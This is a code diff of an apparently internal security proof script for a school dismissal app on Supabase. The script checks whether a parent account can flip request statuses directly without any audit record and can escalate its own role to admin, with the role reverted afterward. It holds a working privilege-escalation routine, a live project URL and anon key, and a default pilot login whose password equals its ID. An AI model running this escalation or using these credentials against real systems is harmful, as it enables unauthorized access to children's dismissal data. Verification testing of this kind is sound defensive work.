@@ -6,9 +6,15 @@
 // The role change is reverted in a finally block so no demo account is harmed.
 import { createClient } from "@supabase/supabase-js";
 
-const URL = "https://dmxqqvlnbwzkqfceyuot.supabase.co";
+// Phase 17: credentials are env-parameterized. Defaults point at the live
+// per-person pilot parent 041 (ID == password).
+const URL = process.env.NEXT_PUBLIC_SUPABASE_URL || "https://dmxqqvlnbwzkqfceyuot.supabase.co";
 const ANON =
+  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY ||
   "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRteHFxdmxuYnd6a3FmY2V5dW90Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODc3OTk1MzUsImV4cCI6MjEwMzM3NTUzNX0.osCtD4y-u2-pmBWb3JZUMhPGalkKM5GiOcrc0ru825U";
+const DOMAIN = process.env.NEXT_PUBLIC_DEMO_EMAIL_DOMAIN || "demo.dismissflow";
+const PARENT_LOGIN = process.env.E2E_PARENT_LOGIN ?? "041";
+const PARENT_PW = process.env.E2E_PARENT_PASSWORD ?? PARENT_LOGIN;
 const mk = () =>
   createClient(URL, ANON, { auth: { persistSession: false, autoRefreshToken: false } });
 
@@ -19,7 +25,7 @@ const check = (name, ok, detail) => {
 };
 
 const parent = mk();
-await parent.auth.signInWithPassword({ email: "041@demo.dismissflow", password: "041" });
+await parent.auth.signInWithPassword({ email: `${PARENT_LOGIN}@${DOMAIN}`, password: PARENT_PW });
 const myId = (await parent.auth.getUser()).data.user.id;
 
 // (A) Create via the trusted RPC (normal path) so we own a request.
@@ -38,7 +44,7 @@ const { data: after } = await parent
   .eq("request_id", reqId)
   .maybeSingle();
 check(
-  "A: client set dismissal_requests.status directly (bypass)",
+  "A-BYPASS: client set dismissal_requests.status directly (bypass)",
   !updErr && after?.status === "DISMISSED",
   `count=${count} status=${after?.status} err=${updErr?.message ?? "none"}`
 );
@@ -48,7 +54,7 @@ const { data: ev } = await parent
   .select("request_id")
   .eq("request_id", reqId)
   .maybeSingle();
-check("A: client status flip created NO audit event", !ev, `event=${ev ? "present" : "absent"}`);
+check("A-AUDIT: client status flip created NO audit event", !ev, `event=${ev ? "present" : "absent"}`);
 
 // (B) Escalate own role to admin — capture original first, revert in finally.
 const { data: before } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
@@ -58,17 +64,17 @@ let escalated = false;
 try {
   const { data: now } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
   escalated = now?.role === "admin";
-  check("B: client escalated public.users.role to admin", escalated, `role=${now?.role} err=${roleErr?.message ?? "none"}`);
+  check("B-BYPASS: client escalated public.users.role to admin", escalated, `role=${now?.role} err=${roleErr?.message ?? "none"}`);
 } finally {
   // Always revert so the demo account is restored.
   await parent.from("users").update({ role: originalRole }).eq("user_id", myId);
   const { data: back } = await parent.from("users").select("role").eq("user_id", myId).maybeSingle();
-  check("B: role reverted (no demo account harmed)", back?.role === originalRole, `role=${back?.role}`);
+  check("B-REVERT: role reverted (no demo account harmed)", back?.role === originalRole, `role=${back?.role}`);
 }
 
 console.log("\n=== PHASE 14 PRIVESC PROOF ===");
 out.forEach((l) => console.log("  " + l));
 console.log(`PHASE14_TEMP_REQUEST_IDS=${reqId ?? ""}`);
-const bypassConfirmed = out.some((l) => l.startsWith("PASS-PROOF A")) && out.some((l) => l.startsWith("PASS-PROOF B"));
+const bypassConfirmed = out.some((l) => l.startsWith("PASS-PROOF A-BYPASS")) && out.some((l) => l.startsWith("PASS-PROOF B-BYPASS"));
 console.log(bypassConfirmed ? "EXPLOITABLE: YES (fix required)" : "EXPLOITABLE: NO");
 process.exit(0);
